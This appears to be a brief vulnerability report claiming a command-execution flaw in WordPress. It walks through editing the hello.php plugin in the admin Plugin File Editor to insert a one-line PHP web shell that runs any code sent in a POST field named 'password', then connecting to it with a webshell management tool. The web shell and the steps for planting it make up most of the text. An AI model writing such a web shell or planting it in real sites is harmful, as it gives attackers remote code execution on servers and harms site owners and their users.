# WordPress Background command execution vulnerability 
## Build the local environment
https://cn.wordpress.org/download/#download-install
## Vulnerability recurrence

/wp-admin/profile.php
![image](https://user-images.githubusercontent.com/45749015/216503131-25f90fa2-17f2-48f5-b52f-579d49ab3c1c.png)

Click >> Tools  >> Plugin File Editor  >>  Change Code hello.php   >>  Add Code `<?php eval(@$_POST['password']);?>`
 >> Save
 ![image](https://user-images.githubusercontent.com/45749015/216503630-cbe9baa1-aff5-4dbc-be66-9107e5102a0b.png)
Use the webshell management tool to connect
![image](https://user-images.githubusercontent.com/45749015/216503750-c1decaba-45bf-464d-9b5f-1af9ea720f43.png)
![image](https://user-images.githubusercontent.com/45749015/216503781-51f44f7b-af40-4dbd-8500-f736b217c86c.png)
## code analysis
Get address:
![image](https://user-images.githubusercontent.com/45749015/216503925-9d8f3295-946c-4d5b-b461-b7b0e8c3d94b.png)
The content is not filtered, resulting in the successful saving of illegal programs
![image](https://user-images.githubusercontent.com/45749015/216503967-c5fd373d-3d91-47a1-aaaf-87f931f3bc1e.png)
